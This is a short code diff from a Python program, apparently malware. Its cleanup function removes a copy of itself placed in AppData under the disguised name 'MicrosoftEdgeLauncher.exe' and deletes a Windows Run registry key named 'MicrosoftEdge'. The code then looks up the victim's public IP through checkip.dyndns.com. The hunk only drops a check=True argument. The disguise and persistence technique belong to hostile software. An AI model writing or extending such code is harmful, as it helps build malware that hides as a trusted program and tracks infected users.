@@ -187,7 +187,7 @@ def cleanup():
         location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe"
         if os.path.exists(location):
             os.remove(location)
-            subprocess.call(rf'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /f', shell=True, check=True)
+            subprocess.call(rf'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /f', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
